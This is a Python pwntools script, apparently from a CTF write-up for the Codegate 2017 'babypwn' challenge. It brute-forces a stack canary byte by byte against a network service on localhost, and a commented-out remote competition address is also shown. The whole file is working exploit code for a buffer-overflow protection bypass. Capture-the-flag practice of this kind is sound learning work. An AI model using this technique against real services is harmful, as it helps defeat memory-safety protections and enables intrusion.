#https://github.com/VulnHub/ctf-writeups/blob/master/2017/codegate-prequels/babypwn.md
#!/usr/bin/env python

from pwn import *

canary = ""
canary_offset = 40
guess = 0x0

buf = ""
buf += "A" * canary_offset
buf += canary

while len(canary) < 4:
    while guess != 0xff:
        try:
            r = remote("localhost", 8181)
            #r = remote("110.10.212.130", 8888)

            r.recvuntil("Select menu > ")
            r.sendline("2")

            r.recvuntil("Input Your Message : ")
            r.send(buf + chr(guess))

            r.recvuntil("Select menu > ")
            r.sendline("3")
            d = r.recv(1024)

            # if we don't get an exception, we guessed the correct byte
            print "Guessed correct byte:", format(guess, '02x')
            canary += chr(guess)
            buf += chr(guess)
            guess = 0x0
            break

        except EOFError,e:
            # guessed the wrong byte
            guess += 1

print "Canary:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
print "Hexdump:", hexdump(canary)
